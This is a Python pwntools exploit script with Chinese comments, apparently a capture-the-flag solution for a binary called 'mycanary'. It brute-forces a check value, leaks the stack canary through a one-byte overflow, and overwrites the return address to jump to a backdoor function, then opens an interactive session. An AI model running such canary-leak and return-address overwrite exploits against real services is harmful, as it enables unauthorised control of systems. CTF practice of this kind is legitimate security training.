from pwn import *

context(arch='amd64', os='linux',log_level ='debug')

# p = process('./mycanary')

p = remote('192.168.31.103', 48659) # 远程

# 尝试遍历所有可能的v8，以进入下一轮

v8 =  16768186 # 0xffabcd
p.sendlineafter('ed.\n',str(v8).encode()) # 先触发一下错误
for i in range(0x2345):
    payload = v8 + i
    p.sendlineafter(b'n.\n',str(payload).encode())
    # 如果匹配到了，就退出
    ret = p.recvuntil(b'] ')
    if 'Error' not in ret.decode():
        print('find it: ',payload)
        break

# 尝试跳过v9[0],v9[1]随意
p.sendlineafter(b't.\n',b'-')
p.sendline(b'1')

# 在跳过v9[0,1]后，开始覆写v9[2]即v10（可以观察stack对于v10内存的分配）
payload = 195874819
p.sendline(str(payload).encode())

# 根据IDA获得的后门函数unreachable
# unreachable=0x4012a8
unreachable = 0x4012ad # 0x4012a8并非正常指令，要调到mov 语句  

# 由于它使用了read函数，且设置的fd是0，所以是standard input
# 这里我们可以某些值使得buffer的值溢出到返回地址，同时返回地址写入后门函数的地址

# 注意buffer的24，但是写入的长度是0x30h即48
p.send(cyclic(25))  # 第一次写入，等待canary
p.recvuntil(b'g')
canary = b'\x00' + p.recvn(7) # 读取canary

# ROP： buff + canary + rbp + ret
p.send(cyclic(24) + canary + cyclic(8)+p64(unreachable))

p.interactive()